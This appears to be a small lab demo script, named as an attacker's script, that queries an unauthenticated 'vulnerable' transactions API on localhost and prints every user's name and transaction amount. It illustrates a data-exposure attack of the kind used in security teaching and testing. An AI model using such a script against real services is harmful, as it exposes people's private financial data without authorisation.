# attacker_script.py

import requests

# URL of the vulnerable API
url = "http://127.0.0.1:5000/transactions"

# Sending a GET request to the API
response = requests.get(url)

if response.status_code == 200:
    transactions = response.json()  # Parse the JSON response

    # Extracting and printing transaction details
    for txn in transactions:
        username = txn.get('username')
        transaction_amount = txn.get('amount')
        print(f"Username: {username}, Transaction Amount: {transaction_amount}")
else:
    print("Failed to fetch data. Status Code:", response.status_code)
